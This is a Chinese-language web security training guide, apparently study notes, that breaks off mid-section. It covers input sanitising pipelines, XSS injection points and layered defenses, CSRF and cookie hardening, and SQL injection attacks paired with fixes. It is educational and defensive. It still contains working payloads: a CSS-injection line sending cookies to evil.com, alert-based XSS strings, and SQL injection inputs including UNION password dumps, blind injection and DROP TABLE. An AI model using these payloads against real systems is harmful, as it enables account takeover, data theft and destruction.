# Web 安全进阶 — 攻防实战演练 (13:00)

> 专项训练 | 2026-04-26 13:00
> 主题: 安全代码模式 + 攻防实战 + 常见漏洞 Checklist
> 前置: `training/web-security-1300.md` (基础理论) + `learning-practice/security/2026-04-25-web-security.md` (完整指南)

---

## 目录

1. [安全代码模式速查](#一安全代码模式速查)
2. [XSS 攻防实战](#二xss-攻防实战)
3. [CSRF 攻防实战](#三csrf-攻防实战)
4. [SQL 注入攻防实战](#四sql-注入攻防实战)
5. [SSRF 攻防实战](#五ssrf-攻防实战)
6. [文件上传安全实战](#六文件上传安全实战)
7. [安全中间件完整实现](#七安全中间件完整实现)
8. [前端安全工具集](#八前端安全工具集)
9. [漏洞扫描 Checklist](#九漏洞扫描-checklist)

---

## 一、安全代码模式速查

### 1.1 不安全 → 安全 对照表

| 不安全模式 | 安全替代 | 风险等级 |
|-----------|---------|---------|
| `innerHTML = userInput` | `textContent = userInput` 或 `DOMPurify.sanitize()` | 🔴 高 |
| `eval(userInput)` | `JSON.parse()` 或 Function 映射表 | 🔴 高 |
| `new Function(userInput)` | 策略模式替代 | 🔴 高 |
| `db.query("SELECT * FROM t WHERE id='" + id + "'")` | `db.query("SELECT * FROM t WHERE id = ?", [id])` | 🔴 高 |
| Cookie 无 `HttpOnly` | `cookie: { httpOnly: true, secure: true, sameSite: 'strict' }` | 🔴 高 |
| 直接拼接 URL 重定向 | 白名单校验 redirect target | 🟡 中 |
| `document.write(userInput)` | DOM API 操作 | 🔴 高 |
| 明文存储密码 | `bcrypt.hash()` / `argon2` | 🔴 高 |
| 硬编码密钥 | 环境变量 / KMS | 🟡 中 |
| 无速率限制 | `express-rate-limit` | 🟡 中 |

### 1.2 安全输入处理管道

```typescript
// --- File: src/security/sanitize-pipeline.ts ---

/**
 * 安全输入处理管道
 * 原则: 输入验证 → 清洗 → 类型转换 → 二次验证
 */

interface SanitizePipeline<T> {
  validate: (input: unknown) => input is T;
  sanitize: (input: T) => T;
  transform?: (input: T) => T;
}

/**
 * 字符串输入管道
 */
function createStringPipeline(options: {
  minLength?: number;
  maxLength?: number;
  pattern?: RegExp;
  trim?: boolean;
  escapeHtml?: boolean;
}): SanitizePipeline<string> {
  const { minLength = 0, maxLength = 1000, pattern, trim = true, escapeHtml = true } = options;

  // HTML 实体编码
  const escapeHtmlEntities = (str: string): string => {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;')
      .replace(/`/g, '&#96;')
      .replace(/\//g, '&#x2F;');
  };

  return {
    validate: (input: unknown): input is string => {
      if (typeof input !== 'string') return false;
      const str = trim ? input.trim() : input;
      if (str.length < minLength || str.length > maxLength) return false;
      if (pattern && !pattern.test(str)) return false;
      return true;
    },
    sanitize: (input: string): string => {
      let result = trim ? input.trim() : input;
      if (escapeHtml) result = escapeHtmlEntities(result);
      return result;
    }
  };
}

/**
 * 数字输入管道
 */
function createNumberPipeline(options: {
  min?: number;
  max?: number;
  integer?: boolean;
}): SanitizePipeline<number> {
  const { min = -Infinity, max = Infinity, integer = false } = options;

  return {
    validate: (input: unknown): input is number => {
      const num = typeof input === 'string' ? parseFloat(input) : Number(input);
      if (isNaN(num) || !isFinite(num)) return false;
      if (integer && !Number.isInteger(num)) return false;
      if (num < min || num > max) return false;
      return true;
    },
    sanitize: (input: number): number => {
      let num = integer ? Math.round(input) : input;
      return Math.max(min, Math.min(max, num));
    }
  };
}

/**
 * 邮箱输入管道
 */
function createEmailPipeline(): SanitizePipeline<string> {
  const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  const base = createStringPipeline({
    minLength: 5,
    maxLength: 254,
    pattern: emailPattern,
    trim: true,
    escapeHtml: false
  });

  return {
    ...base,
    sanitize: (input: string): string => input.toLowerCase().trim()
  };
}

/**
 * URL 输入管道 (防 SSRF + 防 XSS)
 */
function createUrlPipeline(options: {
  allowedProtocols?: string[];
  blockPrivateIps?: boolean;
}): SanitizePipeline<string> {
  const { allowedProtocols = ['https:'], blockPrivateIps = true } = options;

  return {
    validate: (input: unknown): input is string => {
      if (typeof input !== 'string') return false;
      try {
        const url = new URL(input);
        if (!allowedProtocols.includes(url.protocol)) return false;
        // 阻止 javascript: 等危险协议
        if (url.protocol === 'javascript:') return false;
        return true;
      } catch {
        return false;
      }
    },
    sanitize: (input: string): string => {
      try {
        const url = new URL(input);
        // 移除 javascript: 伪协议
        if (url.protocol === 'javascript:') return '#';
        return url.toString();
      } catch {
        return '#';
      }
    }
  };
}

// ==================== 使用示例 ====================

// 1. 用户名验证
const usernamePipe = createStringPipeline({
  minLength: 3,
  maxLength: 20,
  pattern: /^[a-zA-Z0-9_-]+$/,
  trim: true,
  escapeHtml: true
});

// 2. 年龄验证
const agePipe = createNumberPipeline({ min: 0, max: 150, integer: true });

// 3. 邮箱验证
const emailPipe = createEmailPipeline();

// 4. 使用管道处理用户输入
function processUserInput(raw: Record<string, unknown>) {
  const errors: string[] = [];
  const result: Record<string, unknown> = {};

  // 用户名
  if (usernamePipe.validate(raw.username)) {
    result.username = usernamePipe.sanitize(raw.username as string);
  } else {
    errors.push('Invalid username');
  }

  // 邮箱
  if (emailPipe.validate(raw.email)) {
    result.email = emailPipe.sanitize(raw.email as string);
  } else {
    errors.push('Invalid email');
  }

  // 年龄
  if (agePipe.validate(raw.age)) {
    result.age = agePipe.sanitize(raw.age as number);
  } else {
    errors.push('Invalid age');
  }

  if (errors.length > 0) {
    throw new Error(`Validation failed: ${errors.join(', ')}`);
  }

  return result;
}

// 测试
console.log(processUserInput({ username: 'jack_5168', email: 'Jack@Example.COM', age: '25' }));
// → { username: 'jack_5168', email: 'jack@example.com', age: 25 }

console.log(processUserInput({ username: '<script>', email: 'bad', age: 999 }));
// → Error: Validation failed: Invalid username, Invalid email, Invalid age
```

---

## 二、XSS 攻防实战

### 2.1 攻击面全景图

```typescript
// --- File: src/security/xss-attack-surface.ts ---

/**
 * XSS 攻击面全景图
 * 记录所有可能的 XSS 注入点
 */

// ==================== 注入点 1: innerHTML ====================
function attack1_innerHTML() {
  // ❌ 攻击者控制的内容直接写入 innerHTML
  const userInput = '<img src=x onerror="alert(1)">';
  document.getElementById('container')!.innerHTML = userInput;
  // 修复: textContent / DOMPurify / 框架自动转义
}

// ==================== 注入点 2: document.write ====================
function attack2_documentWrite() {
  // ❌ document.write 直接执行脚本
  const searchQuery = '<script>alert(1)</script>';
  document.write(`<h1>Results for: ${searchQuery}</h1>`);
  // 修复: 使用 DOM API
}

// ==================== 注入点 3: URL 属性 ====================
function attack3_urlAttribute() {
  // ❌ javascript: 协议注入
  const userUrl = 'javascript:alert(1)';
  const link = document.createElement('a');
  link.href = userUrl; // 点击即执行
  // 修复: 白名单协议校验
}

// ==================== 注入点 4: 事件处理器 ====================
function attack4_eventHandler() {
  // ❌ 通过属性设置事件处理器
  const eventName = 'onclick';
  const handler = 'alert(1)';
  const el = document.createElement('div');
  el.setAttribute(`on${eventName}`, handler); // 危险！
  // 修复: 使用 addEventListener
}

// ==================== 注入点 5: SVG 内联 ====================
function attack5_svgInline() {
  // ❌ SVG 中的 script 标签
  const svgContent = '<svg><script>alert(1)</script></svg>';
  document.getElementById('svg-container')!.innerHTML = svgContent;
  // 修复: DOMPurify 支持 SVG 清理
}

// ==================== 注入点 6: CSS 注入 ====================
function attack6_cssInjection() {
  // ❌ 通过 CSS expression 执行 JS (旧 IE)
  // 或通过 url() 加载外部资源
  const userColor = 'red); background-image: url(http://evil.com/steal?c=' + document.cookie + ';';
  document.getElementById('styled')!.style.color = userColor;
  // 修复: 颜色白名单
}

// ==================== 注入点 7: postMessage ====================
function attack7_postMessage() {
  // ❌ 不验证 origin 的 postMessage 处理
  window.addEventListener('message', (event) => {
    // 没有验证 event.origin!
    const data = JSON.parse(event.data);
    if (data.action === 'navigate') {
      window.location.href = data.url; // 可能被恶意页面控制
    }
  });
  // 修复: 验证 event.origin
}

// ==================== 注入点 8: eval / Function ====================
function attack8_eval() {
  // ❌ eval 执行用户输入
  const userExpression = 'alert(document.cookie)';
  eval(userExpression);

  // ❌ Function 构造函数同样危险
  const fn = new Function('arg', userExpression);
  fn();
  // 修复: 使用 JSON.parse / 安全表达式解析器
}

// ==================== 注入点 9: template literal ====================
function attack9_templateLiteral() {
  // ❌ 模板字符串中的 XSS (在 SSR 场景)
  const userInput = '</script><script>alert(1)</script>';
  const html = `<script>
    const data = "${userInput}"; // 跳出字符串！
  </script>`;
  // 修复: 在 JS 字符串上下文中也要转义
}

// ==================== 注入点 10: iframe srcdoc ====================
function attack10_iframeSrcdoc() {
  // ❌ iframe srcdoc 中的脚本
  const srcdoc = '<script>alert(1)</script>';
  const iframe = document.createElement('iframe');
  iframe.srcdoc = srcdoc;
  // 修复: sandbox 属性 + srcdoc 内容清理
}
```

### 2.2 深度防御 — 多层 XSS 防护

```typescript
// --- File: src/security/xss-defense-in-depth.ts ---

/**
 * XSS 深度防御体系
 * 多层防护，即使一层被突破，其他层仍然有效
 */

// ==================== Layer 1: 输入验证 ====================
class InputValidator {
  private static readonly DANGEROUS_PATTERNS = [
    /<script[\s>]/i,
    /javascript\s*:/i,
    /on\w+\s*=/i,           // onclick=, onerror=, onload=...
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /<form/i,
    /<input/i,
    /expression\s*\(/i,      // CSS expression
    /url\s*\(\s*['"]?\s*javascript/i,
  ];

  static isSuspicious(input: string): boolean {
    return this.DANGEROUS_PATTERNS.some(pattern => pattern.test(input));
  }

  static validateAndSanitize(input: string, context: 'html' | 'attribute' | 'js' | 'url' | 'css'): string {
    switch (context) {
      case 'html':
        return this.sanitizeForHtml(input);
      case 'attribute':
        return this.sanitizeForAttribute(input);
      case 'js':
        return this.sanitizeForJs(input);
      case 'url':
        return this.sanitizeForUrl(input);
      case 'css':
        return this.sanitizeForCss(input);
      default:
        return input;
    }
  }

  private static sanitizeForHtml(input: string): string {
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;')
      .replace(/`/g, '&#96;');
  }

  private static sanitizeForAttribute(input: string): string {
    // 属性值中需要额外转义 / 和 =
    return this.sanitizeForHtml(input)
      .replace(/\//g, '&#x2F;')
      .replace(/=/g, '&#x3D;');
  }

  private static sanitizeForJs(input: string): string {
    // JS 字符串上下文: 转义所有非字母数字字符
    return input.replace(/[^a-zA-Z0-9]/g, (char) => {
      return '\\u' + char.charCodeAt(0).toString(16).padStart(4, '0');
    });
  }

  private static sanitizeForUrl(input: string): string {
    // URL 编码
    return encodeURIComponent(input);
  }

  private static sanitizeForCss(input: string): string {
    // CSS 上下文: 只允许安全字符
    return input.replace(/[^a-zA-Z0-9\-_]/g, '');
  }
}

// ==================== Layer 2: 输出编码 (上下文感知) ====================
class OutputEncoder {
  /**
   * HTML 正文上下文
   */
  static forHtml(text: string): string {
    return text.replace(/[&<>"'`]/g, (c) => {
      const map: Record<string, string> = {
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#039;', '`': '&#96;'
      };
      return map[c] || c;
    });
  }

  /**
   * HTML 属性上下文
   */
  static forAttribute(text: string): string {
    return this.forHtml(text).replace(/\//g, '&#x2F;');
  }

  /**
   * JavaScript 字符串上下文 (如 <script>var x = "USER_INPUT";</script>)
   */
  static forJsString(text: string): string {
    return text.replace(/\\/g, '\\\\')
      .replace(/'/g, '\\\'')
      .replace(/"/g, '\\"')
      .replace(/`/g, '\\`')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/</g, '\\x3C')
      .replace(/>/g, '\\x3E');
  }

  /**
   * URL 参数上下文
   */
  static forUrl(text: string): string {
    return encodeURIComponent(text);
  }

  /**
   * CSS 值上下文
   */
  static forCss(text: string): string {
    return text.replace(/[^a-zA-Z0-9\-_]/g, (c) => '\\' + c.charCodeAt(0).toString(16));
  }
}

// ==================== Layer 3: CSP (最后一道防线) ====================
function generateCspHeaders(): Record<string, string> {
  const nonce = crypto.randomUUID().replace(/-/g, '');

  return {
    'Content-Security-Policy': [
      "default-src 'self'",
      "script-src 'self' 'nonce-" + nonce + "'",
      "style-src 'self' 'nonce-" + nonce + "'",
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self' https://api.example.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "upgrade-insecure-requests"
    ].join('; '),

    'X-Content-Type-Options': 'nosniff',
    'X-XSS-Protection': '0', // 现代浏览器不需要，反而可能引入问题
    'X-Frame-Options': 'DENY',
  };
}

// ==================== Layer 4: Subresource Integrity (SRI) ====================
function generateSriHash(fileContent: string): string {
  const crypto = require('crypto');
  const hash = crypto.createHash('sha384').update(fileContent).digest('base64');
  return `sha384-${hash}`;
}

// 使用: <script src="app.js" integrity="sha384-xxx" crossorigin="anonymous"></script>

// ==================== 深度防御使用示例 ====================
function renderUserComment(comment: { author: string; content: string; website: string }) {
  // Layer 1: 输入验证
  if (InputValidator.isSuspicious(comment.content)) {
    console.warn('Suspicious comment detected, sanitizing...');
  }

  // Layer 2: 上下文感知的输出编码
  const safeAuthor = OutputEncoder.forHtml(comment.author);
  const safeContent = OutputEncoder.forHtml(comment.content);
  const safeWebsite = OutputEncoder.forUrl(comment.website);

  // Layer 3: CSP 已在 HTTP 头中设置
  // Layer 4: 外部资源使用 SRI

  return `<div class="comment">
    <span class="author">${safeAuthor}</span>
    <p>${safeContent}</p>
    <a href="https://${safeWebsite}" rel="noopener noreferrer">Website</a>
  </div>`;
}
```

### 2.3 实战: 富文本编辑器安全

```typescript
// --- File: src/security/rich-text-sanitizer.ts ---

/**
 * 富文本编辑器安全处理器
 * 允许安全的 HTML 标签，阻止 XSS
 */

import DOMPurify from 'dompurify';

interface SanitizeConfig {
  // 允许的标签
  allowedTags?: string[];
  // 允许的属性
  allowedAttrs?: string[];
  // 允许的协议
  allowedProtocols?: string[];
  // 是否保留换行
  preserveLineBreaks?: boolean;
}

const DEFAULT_CONFIG: SanitizeConfig = {
  allowedTags: [
    'p', 'br', 'strong', 'em', 'u', 's', 'del', 'ins',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li',
    'blockquote', 'pre', 'code',
    'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'span', 'div', 'section',
  ],
  allowedAttrs: [
    'href', 'target', 'rel', 'title', 'alt', 'src', 'width', 'height',
    'class', 'style',
  ],
  allowedProtocols: ['http', 'https', 'mailto', 'tel'],
  preserveLineBreaks: true,
};

class RichTextSanitizer {
  private config: Required<SanitizeConfig>;

  constructor(config?: SanitizeConfig) {
    this.config = { ...DEFAULT_CONFIG, ...config } as Required<SanitizeConfig>;
  }

  /**
   * 清理富文本 HTML
   */
  sanitize(html: string): string {
    // 1. DOMPurify 清理
    let cleaned = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: this.config.allowedTags,
      ALLOWED_ATTR: this.config.allowedAttrs,
      ALLOWED_URI_REGEXP: new RegExp(
        '^(?:(?:https?|mailto|tel):)' + // 只允许安全协议
        '[^\\x00-\\x1F\\x7F-\\x9F <>]*',
        'i'
      ),
      ADD_ATTR: ['target', 'rel'],
      FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input'],
      FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur'],
      KEEP_CONTENT: true,
      WHOLE_DOCUMENT: false,
    });

    // 2. 二次检查: 移除任何残留的事件处理器
    cleaned = cleaned.replace(/\son\w+\s*=\s*["'][^"']*["']/gi, '');
    cleaned = cleaned.replace(/\son\w+\s*=\s*\S+/gi, '');

    // 3. 移除 javascript: 伪协议
    cleaned = cleaned.replace(/javascript\s*:/gi, '');

    // 4. 移除 data: URI (除非是图片)
    cleaned = cleaned.replace(/(src|href)\s*=\s*["']data:(?!image)/gi, '$1="#"');

    // 5. 为外部链接添加 rel="noopener noreferrer"
    cleaned = cleaned.replace(
      /<a\s+([^>]*?)href\s*=\s*["'](https?:\/\/[^"']+)["']([^>]*)>/gi,
      (match, before, href, after) => {
        const hasRel = /rel\s*=/i.test(match);
        const relValue = hasRel
          ? match.replace(/rel\s*=\s*["'][^"']*["']/i, 'rel="noopener noreferrer"')
          : `<a ${before}href="${href}" rel="noopener noreferrer"${after}>`;
        return relValue;
      }
    );

    // 6. 为图片添加 loading="lazy" 和 referrerpolicy
    cleaned = cleaned.replace(
      /<img\s+([^>]*?)src\s*=\s*["']([^"']+)["']([^>]*)>/gi,
      (match, before, src, after) => {
        const extras = [];
        if (!/loading\s*=/i.test(match)) extras.push('loading="lazy"');
        if (!/referrerpolicy\s*=/i.test(match)) extras.push('referrerpolicy="no-referrer"');
        if (!/alt\s*=/i.test(match)) extras.push('alt=""');
        return `<img ${before}src="${src}" ${extras.join(' ')}${after}>`;
      }
    );

    return cleaned;
  }

  /**
   * 从 HTML 中提取纯文本 (用于预览/搜索)
   */
  extractText(html: string): string {
    return this.sanitize(html)
      .replace(/<br\s*\/?>/gi, '\n')
      .replace(/<[^>]+>/g, '')
      .replace(/&amp;/g, '&')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/&quot;/g, '"')
      .replace(/&#039;/g, "'")
      .replace(/&nbsp;/g, ' ')
      .trim();
  }

  /**
   * 截断 HTML 并保持标签闭合
   */
  truncate(html: string, maxLength: number): string {
    const text = this.extractText(html);
    if (text.length <= maxLength) return this.sanitize(html);

    const truncated = text.substring(0, maxLength).replace(/\s+\S*$/, '') + '...';
    return `<p>${OutputEncoder.forHtml(truncated)}</p>`;
  }
}

// ==================== 使用示例 ====================
const sanitizer = new RichTextSanitizer();

// 安全的富文本
console.log(sanitizer.sanitize('<p>Hello <strong>World</strong></p>'));
// → <p>Hello <strong>World</strong></p>

// 阻止 XSS
console.log(sanitizer.sanitize('<p>Hello <script>alert(1)</script></p>'));
// → <p>Hello </p>

// 阻止事件处理器
console.log(sanitizer.sanitize('<img src=x onerror="alert(1)">'));
// → <img src="x" loading="lazy" referrerpolicy="no-referrer" alt="">

// 阻止 javascript: 协议
console.log(sanitizer.sanitize('<a href="javascript:alert(1)">click</a>'));
// → (href 被移除)

// 外部链接自动添加 rel
console.log(sanitizer.sanitize('<a href="https://example.com">link</a>'));
// → <a href="https://example.com" rel="noopener noreferrer">link</a>
```

---

## 三、CSRF 攻防实战

### 3.1 完整 CSRF 防护中间件

```typescript
// --- File: src/security/csrf-protection.ts ---

/**
 * CSRF 完整防护方案
 * 包含: Token 验证 + SameSite Cookie + Origin 检查 + 双重提交
 */

import crypto from 'crypto';

// ==================== CSRF Token 管理器 ====================
class CsrfTokenManager {
  private static readonly TOKEN_LENGTH = 32;
  private static readonly TOKEN_EXPIRY = 24 * 60 * 60 * 1000; // 24 小时

  /**
   * 生成 CSRF Token
   */
  static generate(): string {
    return crypto.randomBytes(this.TOKEN_LENGTH).toString('hex');
  }

  /**
   * 生成同步器模式 Token (包含时间戳)
   * 服务端存储 hash，客户端持有明文
   */
  static generateSyncToken(): { token: string; hash: string } {
    const token = this.generate();
    const hash = crypto.createHash('sha256').update(token).digest('hex');
    return { token, hash };
  }

  /**
   * 验证 Token
   */
  static verify(submittedToken: string, storedHash: string): boolean {
    const submittedHash = crypto.createHash('sha256').update(submittedToken).digest('hex');
    return crypto.timingSafeEqual(
      Buffer.from(submittedHash),
      Buffer.from(storedHash)
    );
  }

  /**
   * 生成 Double Submit Cookie 值
   */
  static generateDoubleSubmitValue(): string {
    return crypto.randomBytes(16).toString('hex');
  }
}

// ==================== Origin 验证器 ====================
class OriginValidator {
  private allowedOrigins: Set<string>;

  constructor(allowedOrigins: string[]) {
    this.allowedOrigins = new Set(allowedOrigins);
  }

  /**
   * 验证 Origin/Referer 头
   */
  validate(origin: string | undefined, referer: string | undefined): boolean {
    // 1. 如果有 Origin 头，直接验证
    if (origin) {
      return this.allowedOrigins.has(origin);
    }

    // 2. 如果没有 Origin (某些浏览器不发)，检查 Referer
    if (referer) {
      try {
        const refererUrl = new URL(referer);
        const refererOrigin = `${refererUrl.protocol}//${refererUrl.host}`;
        return this.allowedOrigins.has(refererOrigin);
      } catch {
        return false;
      }
    }

    // 3. 都没有 → 拒绝 (可能是直接提交或旧浏览器)
    // 注意: GET 请求通常没有 Origin，需要额外处理
    return false;
  }
}

// ==================== Express 中间件 ====================
interface CsrfMiddlewareOptions {
  // 允许的 Origin
  allowedOrigins?: string[];
  // Token 在 header 中的字段名
  headerField?: string;
  // Token 在 body 中的字段名
  bodyField?: string;
  // 哪些 HTTP 方法需要验证
  methods?: string[];
  // Cookie 名称
  cookieName?: string;
  // 是否启用双重提交
  doubleSubmit?: boolean;
}

function createCsrfMiddleware(options: CsrfMiddlewareOptions = {}) {
  const {
    allowedOrigins = [],
    headerField = 'X-CSRF-Token',
    bodyField = '_csrf',
    methods = ['POST', 'PUT', 'PATCH', 'DELETE'],
    cookieName = 'XSRF-TOKEN',
    doubleSubmit = true,
  } = options;

  const originValidator = new OriginValidator(allowedOrigins);

  return (req: any, res: any, next: any) => {
    // 1. 白名单方法跳过
    if (!methods.includes(req.method.toUpperCase())) {
      return next();
    }

    // 2. 生成/刷新 Token (GET 请求)
    if (req.method === 'GET') {
      const csrfToken = CsrfTokenManager.generate();
      // 存储到 session
      if (req.session) {
        req.session.csrfTokenHash = crypto.createHash('sha256').update(csrfToken).digest('hex');
      }
      // 双重提交: 设置 cookie
      if (doubleSubmit) {
        res.cookie(cookieName, csrfToken, {
          httpOnly: false,  // 前端需要读取
          secure: true,
          sameSite: 'strict',
          path: '/',
        });
      }
      // 也放到 res.locals 供模板使用
      res.locals.csrfToken = csrfToken;
      return next();
    }

    // 3. 验证 CSRF Token
    const submittedToken = req.headers[headerField.toLowerCase()] || req.body[bodyField];

    if (!submittedToken) {
      return res.status(403).json({
        error: 'CSRF token missing',
        code: 'CSRF_TOKEN_MISSING'
      });
    }

    // 4. 验证 Token (timing-safe)
    if (req.session && req.session.csrfTokenHash) {
      const isValid = CsrfTokenManager.verify(submittedToken, req.session.csrfTokenHash);
      if (!isValid) {
        return res.status(403).json({
          error: 'CSRF token invalid',
          code: 'CSRF_TOKEN_INVALID'
        });
      }
    }

    // 5. 双重提交验证
    if (doubleSubmit) {
      const cookieToken = req.cookies?.[cookieName];
      if (!cookieToken || cookieToken !== submittedToken) {
        return res.status(403).json({
          error: 'CSRF double-submit mismatch',
          code: 'CSRF_DOUBLE_SUBMIT_MISMATCH'
        });
      }
    }

    // 6. Origin 验证 (额外防护)
    if (allowedOrigins.length > 0) {
      const isValidOrigin = originValidator.validate(
        req.headers.origin,
        req.headers.referer
      );
      if (!isValidOrigin) {
        return res.status(403).json({
          error: 'Invalid origin',
          code: 'CSRF_INVALID_ORIGIN'
        });
      }
    }

    // 7. Token 一次性使用 (验证后清除)
    if (req.session) {
      delete req.session.csrfTokenHash;
    }

    next();
  };
}

// ==================== 前端 Token 自动注入 ====================
/**
 * 前端 Fetch 拦截器: 自动附加 CSRF Token
 */
function createCsrfFetchInterceptor() {
  const originalFetch = window.fetch;

  window.fetch = function (input: RequestInfo | URL, init?: RequestInit): Promise<Response> {
    // 只对有 body 的非 GET 请求附加 Token
    const method = (init?.method || 'GET').toUpperCase();
    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) {
      const csrfToken = getCookie('XSRF-TOKEN');
      if (csrfToken) {
        init = init || {};
        init.headers = init.headers || {};
        if (init.headers instanceof Headers) {
          init.headers.set('X-CSRF-Token', csrfToken);
        } else if (Array.isArray(init.headers)) {
          init.headers.push(['X-CSRF-Token', csrfToken]);
        } else {
          (init.headers as Record<string, string>)['X-CSRF-Token'] = csrfToken;
        }
      }
    }
    return originalFetch.call(this, input, init);
  };
}

function getCookie(name: string): string | null {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}

// ==================== Axios 拦截器版本 ====================
function createAxiosCsrfInterceptor(axios: any) {
  axios.interceptors.request.use((config: any) => {
    const method = (config.method || 'GET').toUpperCase();
    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) {
      const csrfToken = getCookie('XSRF-TOKEN');
      if (csrfToken) {
        config.headers['X-CSRF-Token'] = csrfToken;
      }
    }
    return config;
  });
}
```

### 3.2 SameSite Cookie 完整配置

```typescript
// --- File: src/security/cookie-security.ts ---

/**
 * Cookie 安全配置
 * 包含: SameSite / Secure / HttpOnly / Path / Domain / Expires
 */

interface SecureCookieOptions {
  // SameSite 策略
  sameSite: 'strict' | 'lax' | 'none';
  // 仅 HTTPS
  secure: boolean;
  // JS 不可访问
  httpOnly: boolean;
  // 路径
  path: string;
  // 过期时间
  maxAge?: number;
  // 分区 (CHIPS)
  partitioned?: boolean;
}

const COOKIE_PROFILES = {
  // 会话 Cookie (登录态)
  session: {
    sameSite: 'strict' as const,
    secure: true,
    httpOnly: true,
    path: '/',
    maxAge: 24 * 60 * 60 * 1000, // 24h
  },

  // CSRF Token Cookie (双重提交)
  csrf: {
    sameSite: 'strict' as const,
    secure: true,
    httpOnly: false, // 前端需要读取
    path: '/',
    maxAge: 24 * 60 * 60 * 1000,
  },

  // 偏好设置 (不需要安全保护)
  preferences: {
    sameSite: 'lax' as const,
    secure: true,
    httpOnly: false,
    path: '/',
    maxAge: 365 * 24 * 60 * 60 * 1000, // 1年
  },

  // 第三方嵌入场景 (跨站需要)
  crossSite: {
    sameSite: 'none' as const,
    secure: true,  // none 必须配合 secure
    httpOnly: true,
    path: '/',
    maxAge: 24 * 60 * 60 * 1000,
    partitioned: true, // CHIPS: 分区存储
  },
};

/**
 * 设置安全 Cookie
 */
function setSecureCookie(res: any, name: string, value: string, profile: keyof typeof COOKIE_PROFILES) {
  const options = COOKIE_PROFILES[profile];
  const cookieParts = [
    `${name}=${encodeURIComponent(value)}`,
    `Path=${options.path}`,
    options.secure && 'Secure',
    options.httpOnly && 'HttpOnly',
    `SameSite=${options.sameSite}`,
    options.maxAge && `Max-Age=${Math.floor(options.maxAge / 1000)}`,
    options.partitioned && 'Partitioned',
  ].filter(Boolean);

  res.setHeader('Set-Cookie', cookieParts.join('; '));
}
```

---

## 四、SQL 注入攻防实战

### 4.1 攻击手法全景

```typescript
// --- File: src/security/sql-injection-attacks.ts ---

/**
 * SQL 注入攻击手法全景
 * 了解攻击才能更好防御
 */

// ==================== 攻击 1: 经典字符串拼接 ====================
// ❌ 危险代码
function vulnerableLogin1(username: string, password: string) {
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  // 攻击者输入: username = "admin' --", password = "anything"
  // 生成 SQL: SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
  // 结果: 绕过密码验证!
}

// ✅ 安全代码: 参数化查询
function safeLogin1(username: string, password: string) {
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  // 参数化: ['admin\' --', 'anything']
  // 数据库将参数视为值，不会解析为 SQL
}

// ==================== 攻击 2: 联合查询注入 ====================
// ❌ 危险代码
function vulnerableSearch1(keyword: string) {
  const query = `SELECT id, title FROM articles WHERE title LIKE '%${keyword}%'`;
  // 攻击者输入: ' UNION SELECT username, password FROM users --
  // 生成 SQL: SELECT id, title FROM articles WHERE title LIKE '%' UNION SELECT username, password FROM users --%'
  // 结果: 泄露所有用户密码!
}

// ✅ 安全代码
function safeSearch1(keyword: string) {
  const safeKeyword = keyword.replace(/[%_]/g, '\\$&'); // 转义 LIKE 通配符
  const query = 'SELECT id, title FROM articles WHERE title LIKE ?';
  const params = [`%${safeKeyword}%`];
}

// ==================== 攻击 3: 布尔盲注 ====================
// ❌ 危险代码
function vulnerableCheck1(userId: string) {
  const query = `SELECT COUNT(*) FROM users WHERE id = ${userId} AND role = 'admin'`;
  // 攻击者输入: 1 OR 1=1
  // 攻击者输入: 1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10
  // 通过返回 true/false 逐步推断数据
}

// ✅ 安全代码
function safeCheck1(userId: number) {
  if (!Number.isInteger(userId) || userId <= 0) {
    throw new Error('Invalid user ID');
  }
  const query = 'SELECT COUNT(*) FROM users WHERE id = ? AND role = ?';
  const params = [userId, 'admin'];
}

// ==================== 攻击 4: 时间盲注 ====================
// ❌ 危险代码
function vulnerableTime1(input: string) {
  const query = `SELECT * FROM products WHERE category = '${input}'`;
  // 攻击者输入: ' OR IF(1=1, SLEEP(5), 0) --
  // 通过响应延迟判断条件真假
}

// ✅ 安全代码: 参数化 + 输入验证
function safeTime1(category: string) {
  const allowedCategories = ['electronics', 'books', 'clothing', 'food'];
  if (!allowedCategories.includes(category)) {
    throw new Error('Invalid category');
  }
  const query = 'SELECT * FROM products WHERE category = ?';
}

// ==================== 攻击 5: 堆叠查询 ====================
// ❌ 危险代码 (某些数据库驱动支持多语句)
function vulnerableStack1(input: string) {
  const query = `SELECT * FROM users WHERE name = '${input}'`;
  // 攻击者输入: admin'; DROP TABLE users; --
  // 如果驱动支持多语句，会执行 DROP TABLE
}

// ✅ 安全代码: 参数化 + 禁用多语句
function safeStack1(name: string) {
  // 连接配置禁用多语句
  // const db = mysql.createConnection({ multipleStatements: false });
  const query = 'SELECT * FROM users WHERE name = ?';
}

// ==================== 攻击 6: 二次注入 ====================
// ❌ 危险流程
function vulnerableSecondary1() {
  // Step 1: 注册时存入恶意数据 (看起来安全，因为参数化)
  // db.query('INSERT INTO users (username, bio) VALUES (?, ?)', ['attacker', '<script>']);
